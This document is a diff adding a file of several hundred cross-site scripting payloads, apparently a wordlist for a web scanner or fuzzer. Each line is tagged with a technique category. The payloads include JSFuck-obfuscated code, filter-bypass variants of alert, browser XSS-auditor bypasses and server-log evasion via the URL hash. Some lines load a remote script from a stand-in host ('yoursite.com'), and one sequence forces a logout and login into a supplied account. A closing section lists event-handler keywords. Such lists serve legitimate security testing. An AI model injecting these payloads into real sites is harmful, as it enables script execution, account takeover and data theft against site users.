@@ -1,0 +1,254 @@
+%00alert(0)@XSS nullbyte
+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()@XSS JSFUCK
+<svg onload=alert(1)>@XSS HTML Context Tag Injection
+"><svg onload=alert(1)//@XSS HTML Context Tag Injection
+"onmouseover=alert(1)//@XSS HTML Context Inline Injection
+"autofocus/onfocus=alert(1)//@XSS HTML Context Inline Injection
+'-alert(1)-'@XSS Javascript Context Code Injection
+'-alert(1)//@XSS Javascript Context Code Injection
+\'-alert(1)//@XSS Javascript Context Code Injection(escaping the escape)
+</script><svg onload=alert(1)>@XSS Javascript Context Tag Injection
+<svg onload=alert`1`>@XSS Without Parenthesis
+<svg onload=alert&lpar;1&rpar;>@XSS Without Parenthesis
+<svg onload=alert&#x28;1&#x29>@XSS Without Parenthesis
+<svg onload=alert&#40;1&#41>@XSS Without Parenthesis
+(alert)(1)@XSS Filter Bypass Alert Obfuscation
+a=alert,a(1)@XSS Filter Bypass Alert Obfuscation
+[1].find(alert)@XSS Filter Bypass Alert Obfuscation
+top["al"+"ert"](1)@XSS Filter Bypass Alert Obfuscation
+top[/al/.source+/ert/.source](1)@XSS Filter Bypass Alert Obfuscation
+al\u0065rt(1)@XSS Filter Bypass Alert Obfuscation
+top['al\145rt'](1)@XSS Filter Bypass Alert Obfuscation
+top['al\x65rt'](1)@XSS Filter Bypass Alert Obfuscation
+top[8680439..toString(30)](1)@XSS Filter Bypass Alert Obfuscation
+<body onload=alert(1)>@XSS Body Tag
+<body onpageshow=alert(1)>@XSS Body Tag
+<body onfocus=alert(1)>@XSS Body Tag
+<body onhashchange=alert(1)><a href=#x>click this!#x@XSS Body Tag
+<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x@XSS Body Tag
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><x id=x>#x@XSS Body Tag
+<marquee onstart=alert(1)>@XSS Miscellaneous Vectors
+<marquee loop=1 width=0 onfinish=alert(1)>@XSS Miscellaneous Vectors
+<audio src onloadstart=alert(1)>@XSS Miscellaneous Vectors
+<video onloadstart=alert(1)><source>@XSS Miscellaneous Vectors
+<input autofocus onblur=alert(1)>@XSS Miscellaneous Vectors
+<keygen autofocus onfocus=alert(1)>@XSS Miscellaneous Vectors
+<form onsubmit=alert(1)><input type=submit>@XSS Miscellaneous Vectors
+<select onchange=alert(1)><option>1<option>2@XSS Miscellaneous Vectors
+<menu id=x contextmenu=x onshow=alert(1)>@XSS Miscellaneous Vectors
+<x contenteditable onblur=alert(1)>@XSS Agnostic Event Handlers
+<x onclick=alert(1)>@XSS Agnostic Event Handlers
+<x oncopy=alert(1)>@XSS Agnostic Event Handlers
+<x oncontextmenu=alert(1)>@XSS Agnostic Event Handlers
+<x oncut=alert(1)>@XSS Agnostic Event Handlers
+<x ondblclick=alert(1)>@XSS Agnostic Event Handlers
+<x ondrag=alert(1)>@XSS Agnostic Event Handlers
+<x contenteditable onfocus=alert(1)>@XSS Agnostic Event Handlers
+<x contenteditable oninput=alert(1)>@XSS Agnostic Event Handlers
+<x contenteditable onkeydown=alert(1)>@XSS Agnostic Event Handlers
+<x contenteditable onkeypress=alert(1)>@XSS Agnostic Event Handlers
+<x contenteditable onkeyup=alert(1)>@XSS Agnostic Event Handlers
+<x onmousedown=alert(1)>@XSS Agnostic Event Handlers
+<x onmousemove=alert(1)>@XSS Agnostic Event Handlers
+<x onmouseout=alert(1)>@XSS Agnostic Event Handlers
+<x onmouseover=alert(1)>@XSS Agnostic Event Handlers
+<x onmouseup=alert(1)>@XSS Agnostic Event Handlers
+<x contenteditable onpaste=alert(1)>@XSS Agnostic Event Handlers
+<script>alert(1)// @XSS Code ReuseInline Script
+<script>alert(1)<!–@XSS Code ReuseInline Script
+<script src=//yoursite.com/1.js>@XSS Code Reuse Regular Script
+<script src=//3334957647/1>@XSS Code Reuse Regular Script
+<x onxxx=alert(1) 1='@XSS Generic Source Breaking
+<script>alert(1)</script> @XSS Without Event Handlers
+<script src=javascript:alert(1)> @XSS Without Event Handlers
+<iframe src=javascript:alert(1)> @XSS Without Event Handlers
+<embed src=javascript:alert(1)> @XSS Without Event Handlers
+<a href=javascript:alert(1)>@XSS Without Event Handlers
+<math><test href=javascript:alert(1)>@XSS Without Event Handlers
+<form action=javascript:alert(1)><input type=submit> @XSS Without Event Handlers
+<isindex action=javascript:alert(1) type=submit value=click> @XSS Without Event Handlers
+<form><button formaction=javascript:alert(1)>@XSS Without Event Handlers
+<form><input formaction=javascript:alert(1) type=submit value=click> @XSS Without Event Handlers
+<form><input formaction=javascript:alert(1) type=image value=click> @XSS Without Event Handlers
+<form><input formaction=javascript:alert(1) type=image src=SOURCE> @XSS Without Event Handlers
+<isindex formaction=javascript:alert(1) type=submit value=click>@XSS Without Event Handlers
+<object data=javascript:alert(1)> @XSS Without Event Handlers
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>@XSS Without Event Handlers
+<svg><script xlink:href=data:,alert(1) /> @XSS Without Event Handlers
+<math><test xlink:href=javascript:alert(1)>@XSS Without Event Handlers
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>@XSS Without Event Handlers
+<html ontouchstart=alert(1)> @XSS Mobile Only
+<html ontouchend=alert(1)>@XSS Mobile Only
+<html ontouchmove=alert(1)>  @XSS Mobile Only
+<html ontouchcancel=alert(1)>@XSS Mobile Only
+<body onorientationchange=alert(1)>@XSS Mobile Only
+<iframe src=LOGOUT_URL onload=forms[0].submit()>@XSS Generic Self to Regular XSS
+</iframe><form method=post action=LOGIN_URL>@XSS Generic Self to Regular XSS
+<input name=USERNAME_PARAMETER_NAME value=USERNAME>@XSS Generic Self to Regular XSS
+<input name=PASSWORD_PARAMETER_NAME value=PASSWORD>@XSS Generic Self to Regular XSS
+"><img src=1 onerror=alert(1)>.gif@XSS Injection in Filename
+<script src="data:&comma;alert(1)// @XSS Google Chrome Auditor Bypass
+"><script src=data:&comma;alert(1)// @XSS Google Chrome Auditor Bypass
+<script src="//yoursite.com&sol;1.js&num; @XSS Google Chrome Auditor Bypass
+"><script src=//yoursite.com&sol;1.js&num; @XSS Google Chrome Auditor Bypass
+<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&ol;script&gt; ">@XSS Google Chrome Auditor Bypass
+<svg onload=eval(URL.slice(-8))>#alert(1)@XSS Server Log Avoidance
+<svg onload=eval(location.hash.slice(1)>#alert(1)@XSS Server Log Avoidance
+<svg onload=innerHTML=location.hash>#<script>alert(1)</script>@XSS Server Log Avoidance
+<script></script>@XSS Keys
+<script>@XSS Keys
+<@XSS Keys
+<>@XSS Keys
+>@XSS Keys
+(@XSS Keys
+)@XSS Keys
+()@XSS Keys
+""@XSS Keys
+'test'@XSS Keys
+alert(1)@XSS Keys
+console.log(1)@XSS Keys
+prompt(1)@XSS Keys
+FSCommand@XSS Keys
+onAbort@XSS Keys
+onActivate@XSS Keys
+onAfterPrint@XSS Keys
+onAfterUpdate@XSS Keys
+onBeforeActivate@XSS Keys
+onBeforeCopy@XSS Keys
+onBeforeCut@XSS Keys
+onBeforeDeactivate@XSS Keys
+onBeforeEditFocus@XSS Keys
+onBeforePaste@XSS Keys
+onBeforePrint@XSS Keys
+onBeforeUnload@XSS Keys
+onBeforeUpdate@XSS Keys
+onBegin@XSS Keys
+onBlur@XSS Keys
+onBounce@XSS Keys
+onCellChange@XSS Keys
+onChange@XSS Keys
+onClick@XSS Keys
+onContextMenu@XSS Keys
+onControlSelect@XSS Keys
+onCopy@XSS Keys
+onCut@XSS Keys
+onDataAvailable@XSS Keys
+onDataSetChanged@XSS Keys
+onDataSetComplete@XSS Keys
+onDblClick@XSS Keys
+onDeactivate@XSS Keys
+onDrag@XSS Keys
+onDragEnd@XSS Keys
+onDragLeave@XSS Keys
+onDragEnter@XSS Keys
+onDragOver@XSS Keys
+onDragDrop@XSS Keys
+onDragStart@XSS Keys
+onDrop@XSS Keys
+onEnd@XSS Keys
+onError@XSS Keys
+onErrorUpdate@XSS Keys
+onFilterChange@XSS Keys
+onFinish@XSS Keys
+onFocus@XSS Keys
+onFocusIn@XSS Keys
+onFocusOut@XSS Keys
+onHashChange@XSS Keys
+onHelp@XSS Keys
+onInput@XSS Keys
+onKeyDown@XSS Keys
+onKeyPress@XSS Keys
+onKeyUp@XSS Keys
+onLayoutComplete@XSS Keys
+onLoad@XSS Keys
+onLoseCapture@XSS Keys
+onMediaComplete@XSS Keys
+onMediaError@XSS Keys
+onMessage@XSS Keys
+onMouseDown@XSS Keys
+onMouseEnter@XSS Keys
+onMouseLeave@XSS Keys
+onMouseMove@XSS Keys
+onMouseOut@XSS Keys
+onMouseOver@XSS Keys
+onMouseUp@XSS Keys
+onMouseWheel@XSS Keys
+onMove@XSS Keys
+onMoveEnd@XSS Keys
+onMoveStart@XSS Keys
+onOffline@XSS Keys
+onOnline@XSS Keys
+onOutOfSync@XSS Keys
+onPaste@XSS Keys
+onPause@XSS Keys
+onPopState@XSS Keys
+onProgress@XSS Keys
+onPropertyChange@XSS Keys
+onReadyStateChange@XSS Keys
+onRedo@XSS Keys
+onRepeat@XSS Keys
+onReset@XSS Keys
+onResize@XSS Keys
+onResizeEnd@XSS Keys
+onResizeStart@XSS Keys
+onResume@XSS Keys
+onReverse@XSS Keys
+onRowsEnter@XSS Keys
+onRowExit@XSS Keys
+onRowDelete@XSS Keys
+onRowInserted@XSS Keys
+onScroll@XSS Keys
+onSeek@XSS Keys
+onSelect@XSS Keys
+onSelectionChange@XSS Keys
+onSelectStart@XSS Keys
+onStart@XSS Keys
+onStop@XSS Keys
+onStorage@XSS Keys
+onSyncRestored@XSS Keys
+onSubmit@XSS Keys
+onTimeError@XSS Keys
+onTrackChange@XSS Keys
+onUndo@XSS Keys
+onUnload@XSS Keys
+onURLFlip@XSS Keys
+onWheel@XSS Keys
+<img src=x>test</img>@XSS Keys
+<img dynsrc></img>@XSS Keys
+<img lowsrc></img>@XSS Keys
+<bgsound src=>@XSS Keys
+<iframe src=""></iframe>@XSS Keys
+<BR SIZE="&{alert(1)}">@XSS Keys
+<STYLE></STYLE>@XSS Keys
+<LINK REL="stylesheet" HREF="">@XSS Keys
+jav	ascript:alert(1);@XSS Keys
+" &#14; javascript:alert(1)"@XSS Keys
+<TABLE BACKGROUND="">@XSS Keys
+<TABLE><TD BACKGROUND="">@XSS Keys
+<DIV STYLE="background-image: url()">@XSS Keys
+&#106;&#97;&#118;&#97;@XSS Keys
+&#49;&#41;>@XSS Keys
+String.fromCharCode(88,83,83)@XSS Keys
+offline@XSS Keys
+onbeforeonload@XSS Keys
+onbeforeprint@XSS Keys
+oncanplay@XSS Keys
+oncanplaythrough@XSS Keys
+ondurationchange@XSS Keys
+onemptied@XSS Keys
+onformchange@XSS Keys
+oninvalid@XSS Keys
+onloadeddata@XSS Keys
+onloadedmetadata@XSS Keys
+onloadstart@XSS Keys
+onpagehide@XSS Keys
+onpageshow@XSS Keys
+onplay@XSS Keys
+onplaying@XSS Keys
+onratechange@XSS Keys
+onseeked@XSS Keys
+onseeking@XSS Keys
+onsuspend@XSS Keys
+onwaiting@XSS Keys
+onwheel@XSS Keys
+http://@XSS Keys
